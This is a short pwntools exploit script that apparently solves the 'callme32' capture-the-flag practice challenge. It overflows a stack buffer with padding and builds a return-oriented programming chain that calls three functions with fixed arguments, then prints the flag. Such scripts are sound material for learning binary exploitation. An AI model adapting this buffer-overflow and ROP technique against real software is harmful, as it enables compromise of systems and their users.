#!/usr/bin/env python3

from pwn import *

#ALWAYS DEBUG!
#context.log_level='DEBUG'
context(terminal=['tmux','new-window'],os='linux',arch='i386')
p = gdb.debug('./callme32','b main \n b pwnme \n b callme_one')
#p = process('./callme32')


junk = ("A"* 44).encode()
load_args = p32(0x1)+p32(0x2)+p32(0x3)
#0x080488a9: pop esi; pop edi; pop ebp; ret;
clean_args = p32(0x080488a9)
callme_one = p32(0x80485c0)+clean_args+load_args
callme_two = p32(0x8048620)+clean_args+load_args
callme_three = p32(0x80485b0)+clean_args+load_args

payload= junk+callme_one+callme_two+callme_three
log.info('Payload length: %i'%len(payload))
p.recvuntil('>')
log.info('Sending Payload')
p.sendline(payload)
log.info('Payload Sent')
p.interactive()
p.recvuntil(' ')
flag = p.recv()
log.success("Flag: "+flag.decode('ascii'))
